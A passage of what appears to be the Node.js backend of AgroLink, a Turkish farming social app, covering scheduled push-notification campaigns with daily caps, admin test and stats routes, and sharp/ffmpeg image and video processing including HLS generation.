        return rows && rows.length > 0 ? parseInt(rows[0].cnt) : 0;
    } catch (_) { return 0; }
}

// ── Kampanya gönderim logu kontrolü ──────────────────────────────────────────
// Aynı kampanya bugün bu kullanıcıya gönderildiyse true döner → atla
async function alreadySentToday(userId, campaign) {
    try {
        const rows = await dbAll(
            `SELECT id FROM notification_send_log
             WHERE "userId"=$1 AND campaign=$2 AND date=CURRENT_DATE`,
            [userId, campaign]
        );
        return rows && rows.length > 0;
    } catch (_) { return false; }
}

async function markSent(userId, campaign) {
    try {
        await dbRun(
            `INSERT INTO notification_send_log ("userId", campaign, date)
             VALUES ($1, $2, CURRENT_DATE)
             ON CONFLICT ("userId", campaign, date) DO NOTHING`,
            [userId, campaign]
        );
    } catch (_) {}
}

// ── FCM tokenı olan tüm aktif kullanıcıları getir ────────────────────────────
async function getUsersWithFcmTokens(segments = ['active','medium','passive']) {
    try {
        const rows = await dbAll(`
            SELECT DISTINCT u.id, u.name, u."lastLogin"
            FROM users u
            JOIN device_tokens dt ON dt."userId" = u.id
            WHERE dt."isActive" = TRUE
              AND dt.platform IN ('android','ios','web_fcm')
              AND u."isActive" = TRUE
              AND u."isBanned" = FALSE
              AND u."lastLogin" > NOW() - INTERVAL '30 days'
        `);
        if (!rows) return [];

        // Segment filtresi
        const segmentFilter = async (user) => {
            const seg = await getUserSegment(user.id);
            return segments.includes(seg);
        };

        const filtered = [];
        for (const u of rows) {
            if (await segmentFilter(u)) filtered.push(u);
        }
        return filtered;
    } catch (_) { return []; }
}

// ── Belirli bir kullanıcı kümesine kampanya gönder ────────────────────────────
// opts.campaign: kampanya adı (duplicate koruması için)
// opts.title / opts.body: bildirim metni
// opts.segments: hangi segmentler alacak
// Günlük global bildirim limiti: aktif→3, orta→2, pasif→1
const DAILY_NOTIF_CAP = { active: 3, medium: 2, passive: 1 };

async function getDailyNotifCount(userId) {
    try {
        const r = await dbAll(
            `SELECT COUNT(*) as cnt FROM notification_send_log WHERE "userId"=$1 AND date=CURRENT_DATE`,
            [userId]
        );
        return r && r.length > 0 ? parseInt(r[0].cnt) : 0;
    } catch (_) { return 99; }
}

async function sendCampaign(opts) {
    if (process.env.SMART_NOTIF_ENABLED !== 'true') return;
    const { campaign, title, body, segments = ['active','medium','passive'], data = {} } = opts;
    try {
        const users = await getUsersWithFcmTokens(segments);
        let sent = 0;
        for (const user of users) {
            // ① Aynı kampanya bugün gitti mi?
            if (await alreadySentToday(user.id, campaign)) continue;
            // ② Global günlük cap aşıldı mı?
            const seg  = await getUserSegment(user.id);
            const cap  = DAILY_NOTIF_CAP[seg] ?? 1;
            const sent_today = await getDailyNotifCount(user.id);
            if (sent_today >= cap) {
                console.log(`[SmartNotif] ${campaign} atlandı (günlük limit ${cap}) → userId=${user.id}`);
                continue;
            }
            await sendFcmPush(user.id, { title, body, data });
            await markSent(user.id, campaign);
            sent++;
        }
        if (sent > 0) console.log(`[SmartNotif] ${campaign} → ${sent} kullanıcıya gönderildi`);
    } catch (e) {
        console.error('[SmartNotif sendCampaign]', e.message);
    }
}

// ── 🌅 SABAH KAMPANYASI (07:30) ───────────────────────────────────────────────
async function runMorningCampaign() {
    try {
        const [trending, category, onlineCount] = await Promise.all([
            getTodayTrendingPost(),
            getTodayTopCategory(),
            getOnlineUserCount()
        ]);

        let title = '🌅 Günaydın! Tarım gündemi hazır';
        let body  = 'Bugün çiftçiler ne konuşuyor? Bir bak!';

        if (category) {
            title = `🌱 Günaydın! "${category}" gündemde`;
            body  = `Topluluk bugün ${category} konusunu tartışıyor. Sen ne düşünüyorsun?`;
        }
        if (trending && trending.authorName) {
            body = `${trending.authorName} bugün önemli bir konu paylaştı. Kaçırma!`;
        }
        if (onlineCount > 10) {
            title = `🌅 Günaydın! Şu an ${onlineCount} çiftçi aktif`;
        }

        await sendCampaign({
            campaign : 'morning',
            title,
            body,
            segments : ['active', 'medium'],
            data     : { url: '/feed', type: 'morning' }
        });
    } catch (e) { console.error('[SmartNotif morning]', e.message); }
}

// ── ☀️ ÖĞLE KAMPANYASI (12:30) ─────────────────────────────────────────────────
async function runNoonCampaign() {
    try {
        const [trending, commentCount] = await Promise.all([
            getTodayTrendingPost(),
            getRecentCommentCount()
        ]);

        let title = '🔥 Öğle vakti, tartışmalar kızışıyor';
        let body  = 'Herkes bunu konuşuyor — sen ne düşünüyorsun?';

        if (trending) {
            const preview = trending.content
                ? trending.content.substring(0, 60).replace(/\n/g, ' ') + '…'
                : 'yeni bir konu';
            title = '💬 Şu an en çok konuşulan konu';
            body  = preview;
        }
        if (commentCount > 20) {
            title = `💬 Son 1 saatte ${commentCount} yorum geldi!`;
            body  = 'Tartışmalar hızlandı. Sen de katıl!';
        }

        await sendCampaign({
            campaign : 'noon',
            title,
            body,
            segments : ['active', 'medium', 'passive'],
            data     : { url: '/explore', type: 'noon' }
        });
    } catch (e) { console.error('[SmartNotif noon]', e.message); }
}

// ── 🌇 AKŞAM SERİ — 1. Bildirim (18:00): Kanca ─────────────────────────────
async function runEveningSeries1() {
    try {
        const trending = await getTodayTrendingPost();

        let title = '🔥 Bugün büyük bir tartışma başladı…';
        let body  = 'Tarım topluluğu hareketlendi. Ne olduğunu merak ediyor musun?';

        if (trending && trending.authorName) {
            title = `🔥 ${trending.authorName} patladı!`;
            body  = 'Bugünün en çok konuşulan paylaşımı için tıkla…';
        }

        await sendCampaign({
            campaign : 'serial_1',
            title,
            body,
            segments : ['active', 'medium', 'passive'],
            data     : { url: '/explore', type: 'serial_1' }
        });
    } catch (e) { console.error('[SmartNotif serial_1]', e.message); }
}

// ── 🌇 AKŞAM SERİ — 2. Bildirim (19:30): Büyüyor ────────────────────────────
async function runEveningSeries2() {
    try {
        const [trending, commentCount] = await Promise.all([
            getTodayTrendingPost(),
            getRecentCommentCount()
        ]);

        let title = '👀 O konu büyüyor';
        let body  = 'Yorumlar dinmek bilmiyor. Hâlâ kaçırıyor musun?';

        if (commentCount > 15) {
            title = `👀 Son 1 saatte ${commentCount} yorum!`;
            body  = 'Konu iyice alevlendi. Senin fikrin ne?';
        } else if (trending) {
            const likeScore = (trending.score || 0);
            title = likeScore > 50
                ? `👀 ${likeScore}+ etkileşim — konu patlamak üzere`
                : '👀 O konu büyüyor';
        }

        await sendCampaign({
            campaign : 'serial_2',
            title,
            body,
            segments : ['active', 'medium', 'passive'],
            data     : { url: '/explore', type: 'serial_2' }
        });
    } catch (e) { console.error('[SmartNotif serial_2]', e.message); }
}

// ── 🌇 AKŞAM SERİ — 3. Bildirim (20:30): Patlama ───────────────────────────
async function runEveningSeries3() {
    try {
        const [trending, marketCount, onlineCount] = await Promise.all([
            getTodayTrendingPost(),
            getTodayMarketplaceCount(),
            getOnlineUserCount()
        ]);

        let title = '💥 Patladı! Kaçırma';
        let body  = 'Bugünün en büyük tartışması zirveye ulaştı!';

        if (trending) {
            const preview = trending.content
                ? trending.content.substring(0, 55).replace(/\n/g, ' ') + '…'
                : 'paylaşım';
            title = '💥 Günün en iyi paylaşımı burada!';
            body  = preview;
        }
        if (onlineCount > 20) {
            title = `💥 Şu an ${onlineCount} çiftçi aktif — katıl!`;
        }
        if (marketCount > 5) {
            body += ` Ayrıca bugün ${marketCount} yeni ürün pazara eklendi.`;
        }

        await sendCampaign({
            campaign : 'serial_3',
            title,
            body,
            segments : ['active', 'medium', 'passive'],
            data     : { url: '/explore', type: 'serial_3' }
        });
    } catch (e) { console.error('[SmartNotif serial_3]', e.message); }
}

// ── 🌙 GECE KAMPANYASI (21:30) ────────────────────────────────────────────────
async function runNightCampaign() {
    try {
        const [trending, marketCount] = await Promise.all([
            getTodayTrendingPost(),
            getTodayMarketplaceCount()
        ]);

        let title = '🌙 Bugün kaçırdıklarını gör';
        let body  = 'Günün özeti seni bekliyor. Sana özel içerikler hazır!';

        if (trending && trending.authorName) {
            title = '🌙 Bugünün en iyi paylaşımı';
            body  = `${trending.authorName} bugün toplumu hareketlendirdi. Görmedin mi?`;
        }
        if (marketCount > 3) {
            body = `Bugün ${marketCount} yeni ürün pazara çıktı. Kaçırma!`;
        }

        // Gece bildirimi sadece aktif & orta → pasif kullanıcıyı rahatsız etme
        await sendCampaign({
            campaign : 'night',
            title,
            body,
            segments : ['active', 'medium'],
            data     : { url: '/feed', type: 'night' }
        });
    } catch (e) { console.error('[SmartNotif night]', e.message); }
}

// ── 🔴 PASSİF KULLANICI — "Seni özledik" (her 3 günde 1) ─────────────────────
async function runPassiveCampaign() {
    try {
        const onlineCount = await getOnlineUserCount();
        const title = '🌾 Seni özledik!';
        const body  = onlineCount > 5
            ? `Şu an ${onlineCount} çiftçi aktif. Aramıza katıl!`
            : 'AgroLink\'te senin gibi binlerce çiftçi bekliyor. Hadi dön!';

        await sendCampaign({
            campaign : 'passive_return',
            title,
            body,
            segments : ['passive'],
            data     : { url: '/feed', type: 'passive_return' }
        });
    } catch (e) { console.error('[SmartNotif passive]', e.message); }
}

// ── CRON ZAMANLAYICI ─────────────────────────────────────────────────────────
if (cron && process.env.SMART_NOTIF_ENABLED === 'true') {
    // 🌅 07:30 — Sabah rutini (aktif + orta)
    cron.schedule('30 7 * * *', runMorningCampaign, { timezone: 'Europe/Istanbul' });

    // ☀️ 12:30 — Öğle (tüm segmentler)
    cron.schedule('30 12 * * *', runNoonCampaign, { timezone: 'Europe/Istanbul' });

    // 🌇 18:00 — Seri 1: Kanca
    cron.schedule('0 18 * * *', runEveningSeries1, { timezone: 'Europe/Istanbul' });

    // 🌇 19:30 — Seri 2: Büyüyor
    cron.schedule('30 19 * * *', runEveningSeries2, { timezone: 'Europe/Istanbul' });

    // 🌇 20:30 — Seri 3: Patlama
    cron.schedule('30 20 * * *', runEveningSeries3, { timezone: 'Europe/Istanbul' });

    // 🌙 21:30 — Gece özeti (aktif + orta)
    cron.schedule('30 21 * * *', runNightCampaign, { timezone: 'Europe/Istanbul' });

    // 🔴 Pazartesi + Perşembe 10:00 — Pasif kullanıcı geri getirme
    cron.schedule('0 10 * * 1,4', runPassiveCampaign, { timezone: 'Europe/Istanbul' });

    console.log('✅ Akıllı Bildirim zamanlayıcıları başlatıldı (Europe/Istanbul)');
}

// ── ADMIN TEST + İSTATİSTİK ROTALARI ─────────────────────────────────────────

// POST /api/admin/smart-notif/test — Kampanya anında test et (geliştirici)
app.post('/api/admin/smart-notif/test', authenticateToken, async (req, res) => {
    try {
        if (req.user.role !== 'admin') return res.status(403).json({ error: 'Yetkisiz' });
        const { campaign } = req.body;
        const campaigns = {
            morning   : runMorningCampaign,
            noon      : runNoonCampaign,
            serial_1  : runEveningSeries1,
            serial_2  : runEveningSeries2,
            serial_3  : runEveningSeries3,
            night     : runNightCampaign,
            passive   : runPassiveCampaign,
        };
        if (!campaigns[campaign]) {
            return res.status(400).json({ error: 'Geçersiz kampanya', valid: Object.keys(campaigns) });
        }
        // Test için env'i geçici aç
        const prev = process.env.SMART_NOTIF_ENABLED;
        process.env.SMART_NOTIF_ENABLED = 'true';
        await campaigns[campaign]();
        process.env.SMART_NOTIF_ENABLED = prev;
        res.json({ success: true, campaign, message: 'Test gönderildi' });
    } catch (e) {
        res.status(500).json({ error: 'Hata: ' + e.message });
    }
});

// GET /api/admin/smart-notif/stats — Gönderim istatistikleri
app.get('/api/admin/smart-notif/stats', authenticateToken, async (req, res) => {
    try {
        if (req.user.role !== 'admin') return res.status(403).json({ error: 'Yetkisiz' });

        const [daily, segments, topHours] = await Promise.all([
            // Son 7 günün kampanya özeti
            dbAll(`
                SELECT date, campaign, COUNT(*) as total
                FROM notification_send_log
                WHERE date >= CURRENT_DATE - 7
                GROUP BY date, campaign
                ORDER BY date DESC, campaign
            `),
            // Segment dağılımı
            dbAll(`
                SELECT
                    SUM(CASE WHEN "lastLogin" > NOW()-INTERVAL '2 days'  THEN 1 ELSE 0 END) AS active,
                    SUM(CASE WHEN "lastLogin" BETWEEN NOW()-INTERVAL '7 days' AND NOW()-INTERVAL '2 days' THEN 1 ELSE 0 END) AS medium,
                    SUM(CASE WHEN "lastLogin" BETWEEN NOW()-INTERVAL '30 days' AND NOW()-INTERVAL '7 days' THEN 1 ELSE 0 END) AS passive,
                    SUM(CASE WHEN "lastLogin" < NOW()-INTERVAL '30 days' OR "lastLogin" IS NULL THEN 1 ELSE 0 END) AS dormant
                FROM users WHERE "isActive"=TRUE AND "isBanned"=FALSE
            `),
            // En popüler giriş saatleri
            dbAll(`
                SELECT hour, COUNT(*) as cnt
                FROM user_login_hours
                WHERE "loggedAt" > NOW() - INTERVAL '7 days'
                GROUP BY hour ORDER BY cnt DESC LIMIT 10
            `)
        ]);

        res.json({
            dailySummary : daily,
            userSegments : segments[0] || {},
            topLoginHours: topHours,
            schedulerActive: !!(cron && process.env.SMART_NOTIF_ENABLED === 'true'),
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// ← Akıllı Bildirim Sistemi sonu
// ════════════════════════════════════════════════════════════════════════════

// ==================== DİZİN YAPISI ====================

const uploadsDir   = path.join(__dirname, 'uploads');
const profilesDir  = path.join(uploadsDir, 'profiles');
const postsDir     = path.join(uploadsDir, 'posts');
const videosDir    = path.join(uploadsDir, 'videos');
const thumbnailsDir= path.join(uploadsDir, 'thumbnails');
const hlsDir       = path.join(uploadsDir, 'hls');
const tempDir      = path.join(uploadsDir, 'temp');

// ════════════════════════════════════════════════════════════════════
// 🖼️ GÖRÜNTÜ İŞLEME — Concurrency Limiter + processImage Helper
// ════════════════════════════════════════════════════════════════════
// NEDEN:
//   • sequentialRead:true → EXIF orientation verisi pipeline başlamadan okunamıyor
//     → Dikey fotoğraflar 90° yatmış görünüyor (iPhone/Android)
//   • effort:1-2 → WebP sıkıştırma verimsiz, daha büyük dosyalar
//   • Concurrency kontrolü yok → çok upload = CPU spike, timeout
//
// ÇÖZÜM:
//   • sequentialRead KALDIRILDI → random-access mod, EXIF tam okunuyor
//   • .rotate() her zaman ilk pipeline adımı → EXIF orientation strip + uygula
//   • effort:4, smartSubsample:true → %15-25 küçük dosya, aynı kalite
//   • Semaphore → aynı anda max N resim işlenir

const IMG_CONCURRENCY = Math.min(os.cpus().length, 4); // max 4 paralel işlem
let _imgActive = 0;
const _imgQueue = [];

function acquireImgSlot() {
    return new Promise(resolve => {
        const tryAcquire = () => {
            if (_imgActive < IMG_CONCURRENCY) {
                _imgActive++;
                resolve(() => {
                    _imgActive--;
                    if (_imgQueue.length) _imgQueue.shift()();
                });
            } else {
                _imgQueue.push(tryAcquire);
            }
        };
        tryAcquire();
    });
}

/**
 * Resmi işler: EXIF rotasyonu düzeltir, boyutlandırır, WebP'e çevirir.
 * @param {string} inputPath  - Kaynak dosya yolu
 * @param {string} outputPath - Hedef dosya yolu (.webp)
 * @param {object} opts
 *   width, height  : Maksimum boyut (varsayılan 1920×1920)
 *   fit            : sharp fit modu ('inside' | 'cover') — varsayılan 'inside'
 *   quality        : WebP kalite 1-100 (varsayılan 78)
 *   effort         : WebP sıkıştırma çabası 0-6 (varsayılan 4)
 * @returns {Promise<sharp.OutputInfo>}
 */
async function processImage(inputPath, outputPath, {
    width   = 1920,
    height  = 1920,
    fit     = 'inside',
    quality = 78,
    effort  = 4,
} = {}) {
    const release = await acquireImgSlot();
    try {
        // sequentialRead YOK → random-access mod → EXIF orientation tam okunur
        // .rotate() ilk adım → orientation EXIF tag'i silinir, piksel olarak döndürülür
        // smartSubsample:true → renk kanalı alt örnekleme → %10-15 daha küçük dosya
        const info = await sharp(inputPath, { limitInputPixels: MAX_IMAGE_PIXELS })
            .rotate()                                                    // ← EXIF portrait fix
            .resize(width, height, { fit, withoutEnlargement: true, kernel: 'lanczos3' })
            .webp({ quality, effort, smartSubsample: true })
            .toFile(outputPath);
        return info;
    } finally {
        release();
    }
}

/**
 * Buffer'dan resim işler (Google profil fotoğrafı gibi URL'den indirilen resimler için)
 */
async function processImageBuffer(inputBuffer, outputPath, opts = {}) {
    const release = await acquireImgSlot();
    const { width = 300, height = 300, fit = 'cover', quality = 62, effort = 3 } = opts;
    try {
        const info = await sharp(inputBuffer, { limitInputPixels: MAX_IMAGE_PIXELS })
            .rotate()
            .resize(width, height, { fit, withoutEnlargement: true, kernel: 'lanczos3' })
            .webp({ quality, effort, smartSubsample: true })
            .toFile(outputPath);
        return info;
    } finally {
        release();
    }
}

[uploadsDir, profilesDir, postsDir, videosDir, thumbnailsDir, hlsDir, tempDir].forEach(dir => {
    if (!fssync.existsSync(dir)) {
        fssync.mkdirSync(dir, { recursive: true });
    }
});

// ==================== 🎬 VİDEO SIKIŞTIRMA KONFİGÜRASYONU ====================

const VIDEO_CONFIG = {
    codec       : 'libx264',
    audioCodec  : 'aac',
    audioBitrate: '128k',      // ⬇ 192k→128k (sosyal medya için yeterli)
    quality     : 32,          // ⬇ CRF 28→32 (daha küçük dosya, iyi kalite)
    preset      : 'ultrafast', // ⚡ veryfast → ultrafast (en hızlı encode)
    movflags    : '+faststart', // Web streaming için kritik (metadata başa alınır)
    threads     : '0',          // Tüm CPU çekirdeklerini kullan
    maxWidth    : 1280,         // ⬇ 1920→1280 (720p yeterli, daha küçük dosya)
    maxHeight   : 720,          // ⬇ 1080→720
    fps         : 30,
    maxDuration : 600,          // Maks 10 dk
};

// ── Akıllı CRF: dosya büyüklüğüne göre sıkıştırma oranını artır ──────────────
// 50MB altı: CRF 30 (iyi kalite)
// 50-100MB:  CRF 33 (orta sıkıştırma)
// 100MB+:    CRF 36 (agresif sıkıştırma)
function getAdaptiveCrf(sizeMB) {
    if (sizeMB < 50)  return 30;
    if (sizeMB < 100) return 33;
    return 36;
}

// ── Akıllı çözünürlük: kaynağa göre en uygun boyutu seç ─────────────────────
function getAdaptiveResolution(srcW, srcH, sizeMB) {
    // Büyük dosyalarda çözünürlüğü de düşür
    const maxH = sizeMB > 100 ? 480 : (sizeMB > 50 ? 720 : 720);
    const maxW = sizeMB > 100 ? 854 : 1280;
    return {
        width : Math.min(srcW, maxW),
        height: Math.min(srcH, maxH),
    };
}

// Parçalı yükleme için eşik: bu boyuttan büyük videolar chunk'lanır (MB)
const CHUNK_THRESHOLD_MB = 50;

// HLS Adaptive Bitrate varyantları — küçültülmüş bitrate (sosyal medya standardı)
const HLS_VARIANTS = [
    { name: '360p',  width: 640,  height: 360,  videoBitrate: '500k',  audioBitrate: '64k'  },
    { name: '720p',  width: 1280, height: 720,  videoBitrate: '1500k', audioBitrate: '96k'  },
    { name: '1080p', width: 1920, height: 1080, videoBitrate: '3000k', audioBitrate: '128k' },
];

// ─── Video meta bilgisi al ─────────────────────────────────────────
function getVideoInfo(inputPath) {
    return new Promise((resolve) => {
        if (!fssync.existsSync(inputPath)) {
            return resolve({ duration: 0, width: 1920, height: 1080, aspectRatio: '16:9', bitrate: 5000, codec: 'h264', fileSize: 0, fps: 30 });
        }
        ffmpeg.ffprobe(inputPath, (err, meta) => {
            if (err) {
                console.error('❌ ffprobe hatası:', err.message);
                return resolve({ duration: 0, width: 1920, height: 1080, aspectRatio: '16:9', bitrate: 5000, codec: 'h264', fileSize: 0, fps: 30 });
            }
            try {
                const vs  = meta.streams.find(s => s.codec_type === 'video');
                const as  = meta.streams.find(s => s.codec_type === 'audio');
                let fps = 30;
                if (vs?.r_frame_rate) {
                    const [a, b] = vs.r_frame_rate.split('/').map(Number);
                    if (b) fps = a / b;
                }
                resolve({
                    duration   : meta.format?.duration  || 0,
                    width      : vs?.width              || 1920,
                    height     : vs?.height             || 1080,
                    aspectRatio: vs?.display_aspect_ratio || '16:9',
                    bitrate    : meta.format?.bit_rate ? Math.round(meta.format.bit_rate / 1000) : 5000,
                    codec      : vs?.codec_name         || 'h264',
                    audioCodec : as?.codec_name         || 'aac',
                    fileSize   : meta.format?.size       || 0,
                    fps        : Math.round(fps),
                });
            } catch (e) {
                resolve({ duration: 0, width: 1920, height: 1080, aspectRatio: '16:9', bitrate: 5000, codec: 'h264', fileSize: 0, fps: 30 });
            }
        });
    });
}

// ─── Video optimize et (mp4, faststart) ─────────────────────────────
function optimizeVideo(inputPath, outputPath) {
    return new Promise(async (resolve, reject) => {
        const startTime = Date.now();
        console.log(`🎬 Video sıkıştırma: ${path.basename(inputPath)}`);

        if (!fssync.existsSync(inputPath)) return reject(new Error('Input dosyası bulunamadı'));

        const stats     = fssync.statSync(inputPath);
        const sizeMB    = stats.size / (1024 * 1024);
        const outputDir = path.dirname(outputPath);
        if (!fssync.existsSync(outputDir)) fssync.mkdirSync(outputDir, { recursive: true });

        let vInfo = { width: 1280, height: 720, fps: 30 };
        try { vInfo = await getVideoInfo(inputPath); } catch (_) {}

        // ⚡ Akıllı CRF ve çözünürlük — dosya boyutuna göre agresifleşir
        const adaptiveCrf = getAdaptiveCrf(sizeMB);
        const { width: maxW, height: maxH } = getAdaptiveResolution(vInfo.width, vInfo.height, sizeMB);

        const tw = Math.min(vInfo.width,  maxW);
        const th = Math.min(vInfo.height, maxH);
        const tf = Math.min(vInfo.fps || 30, VIDEO_CONFIG.fps);

        // Oran korunur, H.264 çift piksel zorunluluğu
        const scaleFilter = `scale='min(${tw},iw)':'min(${th},ih)':force_original_aspect_ratio=decrease,scale=trunc(iw/2)*2:trunc(ih/2)*2`;

        console.log(`🎬 [Compress] ${sizeMB.toFixed(1)}MB | CRF:${adaptiveCrf} | Max:${tw}x${th}`);

        // Büyük/yüksek çözünürlüklü videolar için timeout: dosya başına max 30 dakika
        const FFMPEG_TIMEOUT_MS = 30 * 60 * 1000;
        let ffmpegProc = null;
        const timeoutHandle = setTimeout(() => {
            console.error(`⏰ [FFmpeg] Timeout: ${videoId || path.basename(inputPath)}`);
            if (ffmpegProc) try { ffmpegProc.kill('SIGKILL'); } catch (_) {}
        }, FFMPEG_TIMEOUT_MS);

        ffmpegProc = ffmpeg(inputPath)
            .videoCodec(VIDEO_CONFIG.codec)
            .audioCodec(VIDEO_CONFIG.audioCodec)
            .outputOptions([
                `-crf ${adaptiveCrf}`,
                '-preset fast',          // ultrafast → fast: boyut/kalite dengesi
                `-movflags ${VIDEO_CONFIG.movflags}`,
                `-threads ${VIDEO_CONFIG.threads}`,
                `-r ${tf}`,
                `-b:a ${VIDEO_CONFIG.audioBitrate}`,
                '-ac 2',
                `-vf ${scaleFilter}`,
                '-pix_fmt yuv420p',
                '-profile:v high',       // baseline → high: yüksek çözünürlük desteği
                '-level 4.2',            // 3.1 → 4.2: 1080p+ için gerekli
                '-max_muxing_queue_size 1024', // büyük dosyalarda muxer kuyruğu taşmasını önle
            ])
            .format('mp4')
            .on('end', async () => {
                clearTimeout(timeoutHandle);
                const outSize = fssync.existsSync(outputPath) ? fssync.statSync(outputPath).size : 0;
                const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
                const reduction = outSize ? (((sizeMB - outSize / 1024 / 1024) / sizeMB) * 100).toFixed(1) : 0;
                console.log(`✅ Video hazır: ${sizeMB.toFixed(1)}MB → ${(outSize/1024/1024).toFixed(1)}MB (%${reduction} azalma) ${elapsed}s`);
                try { await fs.unlink(inputPath); } catch (_) {}
                resolve({ success: true, optimized: true, fileSize: outSize, reduction: parseFloat(reduction) });
            })
            .on('error', async (err) => {
                clearTimeout(timeoutHandle);
                console.error('❌ FFmpeg hatası, fallback kopyalama:', err.message);
                try {
                    await fs.copyFile(inputPath, outputPath);
                    const fb = fssync.statSync(outputPath);
                    try { await fs.unlink(inputPath); } catch (_) {}
                    resolve({ success: true, optimized: false, fileSize: fb.size });
                } catch (e) {
                    reject(e);
                }
            })
            .save(outputPath);
    });
}

// ─── Video thumbnail oluştur ─────────────────────────────────────────
function createVideoThumbnail(videoPath, thumbnailPath) {
    return new Promise((resolve) => {
        if (!fssync.existsSync(videoPath)) return resolve(false);
        const thumbDir = path.dirname(thumbnailPath);
        if (!fssync.existsSync(thumbDir)) fssync.mkdirSync(thumbDir, { recursive: true });

        // Thumbnail yolunu kesinlikle .jpg yap
        const finalThumbPath = thumbnailPath.replace(/\.[^.]+$/, '.jpg');

        ffmpeg(videoPath)
            .screenshots({
                timestamps: ['00:00:01'],
                filename  : path.basename(finalThumbPath),
                folder    : thumbDir,
                size      : '640x360',
            })
            .on('end', async () => {
                // ffmpeg çıktısı bazen webp/png olabilir, sharp ile kesinlikle jpg'ye dönüştür
                try {
                    await sharp(finalThumbPath)
                        .rotate()
                        .jpeg({ quality: 85 })
                        .toFile(finalThumbPath + '.tmp.jpg');
                    fssync.renameSync(finalThumbPath + '.tmp.jpg', finalThumbPath);
                } catch (_) {}
                console.log('✅ Thumbnail [jpg]:', finalThumbPath);
                resolve(true);
            })
            .on('error', async (err) => {
                console.error('❌ Thumbnail hatası:', err.message);
                // Varsayılan yeşil placeholder jpg
                try {
                    await sharp({ create: { width: 640, height: 360, channels: 3, background: { r: 30, g: 100, b: 30 } } })
                        .jpeg({ quality: 80 }).toFile(finalThumbPath);
                    resolve(true);
                } catch { resolve(false); }
            });
    });
}

// ─── HLS Adaptive Bitrate (YouTube algoritması) ───────────────────────
// Üretilen yapı:
//   uploads/hls/{videoId}/master.m3u8         ← Ana manifest
//   uploads/hls/{videoId}/360p/playlist.m3u8  ← 360p segmentleri
//   uploads/hls/{videoId}/720p/playlist.m3u8  ← 720p segmentleri
//   uploads/hls/{videoId}/1080p/playlist.m3u8 ← 1080p segmentleri
//   Her segment = 4 saniye (YouTube standardı)
async function generateHLSVariants(inputMp4Path, videoId) {
    const startTime  = Date.now();
    const outputBase = path.join(hlsDir, videoId);

    console.log(`🎬 [HLS] Başlatılıyor → ${videoId}`);

    let vInfo = { width: 1920, height: 1080, fps: 30 };
    try { vInfo = await getVideoInfo(inputMp4Path); } catch (_) {}

    // Kaynağa uygun varyantları seç (gereksiz upscale yok)
    let activeVariants = HLS_VARIANTS.filter(v => v.height <= vInfo.height + 120);
    if (activeVariants.length === 0) activeVariants = [HLS_VARIANTS[0]];

    for (const v of activeVariants) {
        const dir = path.join(outputBase, v.name);
        if (!fssync.existsSync(dir)) fssync.mkdirSync(dir, { recursive: true });
    }

    const encodedVariants = [];

    // ⚡ TÜM VARYANTLARı PARALEL OLUŞTUR (eskiden sıralıydı, şimdi aynı anda)
    await Promise.all(activeVariants.map(async (variant) => {
        const outDir      = path.join(outputBase, variant.name);
        const playlist    = path.join(outDir, 'playlist.m3u8');
        const scaleFilter = `scale='min(${variant.width},iw)':'min(${variant.height},ih)':force_original_aspect_ratio=decrease,scale=trunc(iw/2)*2:trunc(ih/2)*2`;

        await new Promise((resolve) => {
            ffmpeg(inputMp4Path)
                .videoCodec('libx264')
                .audioCodec('aac')
                .outputOptions([
                    `-b:v ${variant.videoBitrate}`,
                    `-maxrate ${variant.videoBitrate}`,
                    `-bufsize ${parseInt(variant.videoBitrate) * 2}k`,
                    `-b:a ${variant.audioBitrate}`,
                    `-vf ${scaleFilter}`,
                    '-pix_fmt yuv420p',
                    '-profile:v main',
                    '-level 3.1',
                    '-preset ultrafast',            // ⚡ fast → ultrafast (3x daha hızlı)
                    '-tune fastdecode',             // ⚡ Hızlı oynatma için tune
                    '-hls_time 6',                  // ⚡ 4s → 6s (daha az segment dosyası)
                    '-hls_list_size 0',
                    '-hls_segment_type mpegts',
                    `-hls_segment_filename ${path.join(outDir, 'seg%03d.ts')}`,
                    '-hls_flags independent_segments+split_by_time',
                    '-f hls',
                ])
                .output(playlist)
                .on('end',   () => { console.log(`  ✅ [HLS] ${variant.name}`); resolve(); })
                .on('error', (e) => { console.error(`  ⚠️ [HLS] ${variant.name}: ${e.message}`); resolve(); })
                .run();
        });

        if (fssync.existsSync(playlist)) encodedVariants.push(variant);
    }));

    if (encodedVariants.length === 0) {
        console.warn(`⚠️ [HLS] Varyant oluşturulamadı: ${videoId}`);
        return false;
    }

    // Master manifest yaz
    let master = '#EXTM3U\n#EXT-X-VERSION:3\n';
    for (const v of encodedVariants) {
        const bps = parseInt(v.videoBitrate) * 1000;
        master += `#EXT-X-STREAM-INF:BANDWIDTH=${bps},RESOLUTION=${v.width}x${v.height},NAME="${v.name}"\n`;
        master += `${v.name}/playlist.m3u8\n`;
    }
    fssync.writeFileSync(path.join(outputBase, 'master.m3u8'), master, 'utf8');

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    console.log(`✅ [HLS] Tamamlandı → ${videoId} (${elapsed}s)`);
    return true;
}

// ─── Yardımcı: video kalite etiketi ──────────────────────────────────
function getVideoQuality(w, h) {
    if (h >= 1080) return '1080p';
    if (h >= 720)  return '720p';
    if (h >= 480)  return '480p';
    if (h >= 360)  return '360p';
    return '240p';
}

// ─── Yardımcı: dosya boyutu formatla ─────────────────────────────────
function formatFileSize(bytes) {
    if (!bytes) return '0 B';
    const units = ['B', 'KB', 'MB', 'GB'];
    let i = 0, v = bytes;
    while (v >= 1024 && i < units.length - 1) { v /= 1024; i++; }
    return `${v.toFixed(1)} ${units[i]}`;
}

// ─── Arka plan video işleme kuyruğu (büyük dosyalar için) ────────────
// Sunucuyu bloklamaz, gönderi hemen paylaşılır; HLS arka planda hazırlanır
// ==================== 🎬 VİDEO PARALEL İŞLEME ====================
// Her video bağımsız goroutine'de işlenir — sıralı kuyruk YOK
// Aynı anda N video paralel olarak optimize/HLS/thumbnail üretir

const MAX_CONCURRENT_VIDEOS = parseInt(process.env.MAX_CONCURRENT_VIDEOS || '8'); // ⚡ 3 → 8 paralel video
let activeVideoJobs = 0;

async function processVideoAsync(postId, inputPath, videoId) {
    // Kaynak kontrolü - senkron modda sadece sayacı yönet
    if (activeVideoJobs >= MAX_CONCURRENT_VIDEOS) {
        // Diğer işler bitene kadar bekle (polling)
        while (activeVideoJobs >= MAX_CONCURRENT_VIDEOS) {
            await new Promise(r => setTimeout(r, 500));
        }
    }

    activeVideoJobs++;
